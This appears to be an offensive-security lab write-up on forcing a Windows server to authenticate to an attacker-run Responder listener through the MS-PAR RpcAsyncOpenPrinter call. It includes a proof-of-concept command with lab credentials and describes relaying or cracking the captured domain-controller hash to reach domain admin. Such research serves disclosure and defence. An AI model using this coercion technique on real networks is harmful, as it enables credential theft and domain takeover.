# MS-PAR - Remote call to RpcAsyncOpenPrinter (opnum 0)

## Summary

 - **Protocol**: [[MS-PAR]: Print System Asynchronous Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0)

 - **Protocol UUID**: 76f03f96-cdfd-44fc-a22c-64950a001209

 - **Protocol version**: 1.0

 - **Function name**: [`RpcAsyncOpenPrinter`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/feddac6a-bd88-4989-95fb-715bd6ca796a)

 - **Function operation number**: `0`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine.

Then we need to connect to the remote SMB pipe `\PIPE\spoolss` and bind to (uuid `76f03f96-cdfd-44fc-a22c-64950a001209`, version `1.0`) in order to perform calls to RPC functions of the `MS-PAR` protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\spoolss`. This pipe is connected to the protocol [[MS-PAR]: Print System Asynchronous Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0) and allows to call RPC functions of this protocol. It will then call the remote [`RpcAsyncOpenPrinter`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/feddac6a-bd88-4989-95fb-715bd6ca796a) function on the Windows Server (192.168.2.1) with the following parameters:

```cpp
RpcAsyncOpenPrinter('\\192.168.2.51\test\\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\NETLOGON` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to ohter services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

---

## Function technical detail

```cpp
DWORD RpcAsyncOpenPrinter(
    [in] handle_t hRemoteBinding,
    [in, string, unique] wchar_t* pPrinterName,
    [out] PRINTER_HANDLE* pHandle,
    [in, string, unique] wchar_t* pDatatype,
    [in] DEVMODE_CONTAINER* pDevModeContainer,
    [in] DWORD AccessRequired,
    [in] SPLCLIENT_CONTAINER* pClientInfo
);
```

 - **hRemoteBinding**: An RPC explicit binding handle.

## References

 - Documentation of protocol [MS-PAR]: Print System Asynchronous Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0


 - Documentation of function `RpcAsyncOpenPrinter`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/feddac6a-bd88-4989-95fb-715bd6ca796a